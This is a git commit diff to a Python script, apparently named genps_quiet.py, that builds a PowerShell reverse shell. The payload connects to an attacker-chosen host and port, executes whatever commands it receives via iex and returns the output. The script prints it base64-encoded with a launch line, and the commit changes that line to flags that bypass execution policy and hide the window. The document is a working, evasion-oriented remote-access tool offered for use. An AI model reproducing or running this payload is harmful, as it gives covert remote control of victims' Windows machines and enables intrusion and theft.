646622860d4652d44e35b82a466322eba7a3f377
zed <oethan520@gmail.com>
2023-08-10 02:23:03 -0400

    changed powershell flags

--- scripts/genps_quiet.py
+++ scripts/genps_quiet.py
@@ -12,5 +12,5 @@ else:
     exit()
 
 payload = '$client = New-Object System.Net.Sockets.TCPClient("'+str(lhost)+'",'+str(lport)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-cmd = "powershell -nop -w hidden -enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+cmd = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 print(cmd)
